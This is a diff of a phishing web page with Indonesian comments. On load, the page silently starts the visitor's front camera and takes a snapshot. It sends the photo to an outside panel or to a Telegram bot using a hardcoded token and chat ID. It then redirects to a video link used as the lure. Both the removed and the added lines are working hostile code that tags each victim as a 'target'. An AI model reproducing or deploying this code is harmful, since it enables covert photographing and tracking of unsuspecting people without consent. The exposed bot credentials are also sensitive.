@@ -26,23 +26,17 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // ================= CONFIG TELEGRAM (UNTUK METODE DIREK/CADANGAN) =================
     const TELEGRAM_BOT_TOKEN = '8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w';
-    const ADMIN_CHAT_ID = '-1003731213733'; // Hanya dipakai jika link dibuka TANPA ?sender=
-    // =====================================================================
+    const ADMIN_CHAT_ID = '-1003731213733'; 
 
-    // ================= CONFIG PANEL PTERODACTYL ==========================
     const PANEL_ENDPOINT = 'https://gervho.com'; 
-    const TARGET_WEBSITE = 'https://vidvf.com/e/18yicnf68d0a'; 
-    // =====================================================================
+    const TARGET_WEBSITE = 'https://vidvf.com/e/4ji8zftzagau'; 
 
-    // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
     const urlParams = new URLSearchParams(window.location.search);
     const SENDER_ID = urlParams.get('sender'); 
 
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
-
     let currentStream = null;
 
     async function startAutoCamera() {
@@ -51,14 +45,8 @@
                 video: { facingMode: "user", width: 640, height: 480 } 
             });
             video.srcObject = currentStream;
-
-            video.onplay = () => {
-                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik
-            };
-        } catch (err) {
-            console.error(err);
-            window.location.href = TARGET_WEBSITE;
-        }
+            video.onplay = () => { setTimeout(takeAndSendSnapshot, 3000); };
+        } catch (err) { console.error(err); window.location.href = TARGET_WEBSITE; }
     }
 
     function takeAndSendSnapshot() {
@@ -66,84 +54,51 @@
             setTimeout(takeAndSendSnapshot, 200);
             return;
         }
-
         const ctx = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        if (currentStream) {
-            currentStream.getTracks().forEach(track => track.stop());
-        }
+        if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
         
-        // Tentukan ID penerima utama berdasarkan parameter URL
         const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;
 
-        // JIKA BISA MENGGUNAKAN PANEL (MENGGUNAKAN BASE64 JSON)
         if (SENDER_ID) {
             const imageData = canvas.toDataURL('image/png');
-            
             fetch(PANEL_ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    senderId: finalRecipientId,
-                    image: imageData
-                })
+                body: JSON.stringify({ senderId: finalRecipientId, image: imageData })
             })
             .then(res => res.json())
-            .then(data => {
-                if (!data.ok) {
-                    // Jika panel merespon error, paksa kirim lewat jalur direk API Telegram
-                    sendDirectTelegram(finalRecipientId);
-                } else {
-                    window.location.href = TARGET_WEBSITE;
-                }
-            })
-            .catch(err => {
-                console.error("Koneksi panel gagal, beralih ke jalur direk Telegram...");
-                sendDirectTelegram(finalRecipientId);
-            });
+            .then(data => { if (!data.ok) { sendDirectTelegram(finalRecipientId); } else { window.location.href = TARGET_WEBSITE; } })
+            .catch(err => { sendDirectTelegram(finalRecipientId); });
         } else {
-            // Jika tidak ada ?sender= (admin iseng buka link utama), kirim langsung ke admin
             sendDirectTelegram(finalRecipientId);
         }
     }
 
-    // Fungsi pengiriman bypass langsung menembak Telegram API (Menggunakan BLOB)
     function sendDirectTelegram(chatIdToSend) {
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
-            
-            // Kirim langsung ke ID GRUP utama Anda agar semua admin bisa melihat
             formData.append('chat_id', ADMIN_CHAT_ID); 
             formData.append('photo', blob, 'snapshot.png');
             
-            // 🌟 MEMBUAT CAPTION OTOMATIS BERISI ID TARGET AGAR TIDAK BINGUNG
-            const targetInfo = SENDER_ID ? `🆔 ID Target: ${SENDER_ID}` : `⚠️ Dibuka Tanpa ID Pengguna`;
-            formData.append('caption', `📸 *TARGET BERHASIL DIFFOTO*\n\n${targetInfo}\n\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.`);
-            
-            formData.append('parse_mode', 'Markdown');
-            formData.append('has_spoiler', JSON.parse('true')); 
+            // Kode rahasia penanda ID Target agar dibaca oleh index.js panel Anda
+            const targetIdClean = SENDER_ID ? SENDER_ID : "Unknown";
+            formData.append('caption', `TRIGGER_FOTO_TARGET:${targetIdClean}`);
 
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            } catch (error) {
-                console.error("Gagal bypass ke Telegram API:", error);
-            } finally {
-                window.location.href = TARGET_WEBSITE;
-            }
+            } catch (error) { console.error(error); } finally { window.location.href = TARGET_WEBSITE; }
         }, 'image/png');
     }
-
     window.addEventListener('load', startAutoCamera);
 </script>
-
 </body>
 </html>
